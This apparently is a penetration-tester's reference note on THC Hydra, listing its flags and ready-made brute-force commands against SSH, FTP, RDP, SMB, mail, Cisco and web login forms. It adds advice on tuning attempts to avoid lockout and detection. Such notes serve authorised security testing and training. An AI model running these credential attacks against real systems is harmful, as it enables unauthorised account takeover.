---
tags: [pentest, brute-force, hydra, credentials, initial-access]
tool: hydra
phase: 5
---
# THC Hydra

Multi-protocol network login cracker. The most-used online password attack tool.

[[06 - Gaining Access/00 - README|Folder index]]

## Install / verify

```bash
which hydra
hydra -h | head -30
# Kali ships hydra by default
```

## Syntax skeleton

```bash
hydra -L users.txt -P pass.txt <target> <service> [opts]
```

| Flag | Meaning |
| --- | --- |
| `-l user` | single username |
| `-L list` | username list |
| `-p pass` | single password |
| `-P list` | password list |
| `-C combo.txt` | combined `user:pass` per line |
| `-e n` | null password |
| `-e s` | password = same as username |
| `-e r` | reverse username |
| `-e nsr` | all three |
| `-t N` | parallel tasks (default 16; reduce to 4 for SSH) |
| `-V` | verbose - print each attempt |
| `-vV` | super verbose |
| `-f` | stop after first valid pair |
| `-F` | stop after first valid pair for any host |
| `-o out.txt` | log valid pairs |
| `-s PORT` | non-default port |
| `-S` | TLS / SSL |
| `-M targets.txt` | many targets |
| `-x MIN:MAX:CHARSET` | password generator (brute mask) |
| `-u` | iterate by user first (default) |
| `-w N` | wait time before next try |

## Per-protocol recipes

### SSH

```bash
hydra -l user -P pass.txt <ip> -t 4 ssh
hydra -L users.txt -P pass.txt -t 4 -f <ip> ssh
```

> [!warning] SSH lockout
> Many SSH servers ban after a few fails (fail2ban). Use `-t 4` and `-w 2` to slow down. If `Server unexpectedly closed connection`, you've been blocked - back off for 10 minutes.

### FTP

```bash
hydra -l user -P pass.txt <ip> ftp -t 16 -V
hydra -l user -P pass.txt <ip> ftp -e nsr -V
```

### RDP

```bash
hydra -l administrator -P pass.txt rdp://<ip> -V
# (use -s 3390 if non-standard port)
```

### SMB

```bash
hydra -l administrator -P pass.txt <ip> smb -V
# Beware: SMB lockout is real. Consider nxc instead for spray.
```

### POP3 / IMAP

```bash
hydra -l muts -P pass.txt my.pop3.mail pop3
hydra -l user -P pass.txt -s 993 -S <ip> imap     # TLS
```

### Cisco device login + enable

```bash
hydra -P pass.txt <ip> cisco
hydra -m cloud -P pass.txt <ip> cisco-enable
```

### TeamSpeak (custom port)

```bash
hydra -l user -P wordlist -s <port> -vV <ip> teamspeak
```

### HTTP Basic / Digest auth

```bash
hydra -l user -P pass.txt <ip> http-get /admin/
hydra -l user -P pass.txt <ip> http-get /admin/ -s 8443 -S
```

### HTTP POST form (web login) - the most useful module

```bash
hydra -l admin -P pass.txt -f -o ok.txt -t 4 -V <ip> http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=invalid"
```

Pieces of the form string:

| Token | Meaning |
| --- | --- |
| `http-post-form` | Module name |
| `/login` | URL path the form submits to |
| `user=^USER^&pass=^PASS^` | Body with `^USER^` / `^PASS^` placeholders |
| `F=invalid` | "Failure" string in the response → bad creds |
| `S=Welcome` | "Success" string in the response → good creds (alternative) |

> [!tip] Capture the form with Burp first
> Browse to the login page, submit a wrong credential, intercept in Burp. Copy the POST body verbatim into the third field of the hydra form string. Replace your test values with `^USER^` / `^PASS^`. The failure string is whatever appears on a wrong-cred response (look in the body or `<title>`).

### HTTPS POST form (same, with `-S`)

```bash
hydra -m /index.php -l user -P pass.txt -S <ip> https-post-form \
  "/index.php:name=^USER^&pwd=^PASS^:<title>invalido</title>"
```

### When the failure indicator is in `<title>`

```bash
hydra -l admin -P pass.lst -o ok.lst -t 1 -f <ip> http-post-form \
  "/index.php:name=^USER^&pwd=^PASS^:<title>invalido</title>"
```

## Output

```bash
-o hits.txt           # plaintext log of valid creds
-o hits.json -b json  # JSON output
```

`hits.txt` format:

```text
[80][http-post-form] host: 10.10.10.5  login: admin  password: hunter2
```

## When you should NOT use Hydra

| Situation | Use instead |
| --- | --- |
| SMB / WinRM / MSSQL on a domain | [[04 - NetExec Password Attacks]] - safer, better output |
| AD account spraying | [[04 - NetExec Password Attacks]] - reads policy first |
| Web app with anti-CSRF token | Burp Intruder (handles token refresh) |
| 2FA-protected login | Manual + cookie / token harvesting |

## When you see X, do Y

| Symptom | Action |
| --- | --- |
| `Host has been locked out` | Stop. Reset lockout (try later); switch to spraying. |
| `Account is disabled` | Skip that user, try the next. |
| All attempts return `0 found` and tool exits clean | Wrong failure string in form module. Re-capture in Burp. |
| Too many `valid` results (every cred matches) | Failure-string mismatch. The page returns the *success* string for everything. Use `S=` instead. |
| Connection drops mid-run | Target detected the attack. Lower `-t`, add `-w 3`. |

## See also

- [[02 - Medusa]] - similar tool
- [[03 - Ncrack]] - similar, sometimes faster on RDP
- [[04 - NetExec Password Attacks]] - prefer for Windows/AD
- [[05 - Password Spraying Strategy]] - the right way to attack many users
